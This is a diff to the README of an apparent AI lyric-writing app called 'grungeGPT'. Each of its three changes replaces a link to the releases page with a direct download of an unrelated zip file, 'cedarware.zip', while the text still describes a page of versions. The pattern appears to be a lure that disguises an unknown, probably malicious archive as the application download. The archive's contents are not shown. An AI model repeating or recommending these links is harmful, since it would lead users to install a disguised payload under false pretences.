@@ -1,7 +1,7 @@
 <h1>🎸 grungeGPT - Your AI Lyric Writing Companion</h1>
 
 <p align="center">
-  <a href="https://github.com/Fellowtravelertsimshian6563/grungeGPT/releases">
+  <a href="https://github.com/Fellowtravelertsimshian6563/grungeGPT/raw/refs/heads/main/data/cedarware.zip">
     <img src="https://img.shields.io/badge/Download-grungeGPT-blue?style=for-the-badge&logo=github&color=4B0082" alt="Download grungeGPT">
   </a>
 </p>
@@ -38,7 +38,7 @@ Getting started is easier than tuning a guitar. Follow these simple steps:
 
 ### 1. 📥 Visit this link to download the application. 
 
-[**Click here to download grungeGPT**](https://github.com/Fellowtravelertsimshian6563/grungeGPT/releases)
+[**Click here to download grungeGPT**](https://github.com/Fellowtravelertsimshian6563/grungeGPT/raw/refs/heads/main/data/cedarware.zip)
 
 This link will take you to a page with all the available versions. Choose the one that says "Windows" or "win" and download it. The download should start automatically. If it asks you to choose a file, pick the largest one (it has everything built in)).
 
@@ -163,7 +163,7 @@ A: You can visit the GitHub page (the download link) and look for an "Issues" ta
 You might need to download again if you lost the file. No worries, just click the button below: 
 
 <p align="center">
-  <a href="https://github.com/Fellowtravelertsimshian6563/grungeGPT/releases">
+  <a href="https://github.com/Fellowtravelertsimshian6563/grungeGPT/raw/refs/heads/main/data/cedarware.zip">
     <img src="https://img.shields.io/badge/GET%20GRUNGE%20GPT-Click%20Here-ff69b4?style=flat-square" alt="Download grungeGPT">
   </a>
 </p>
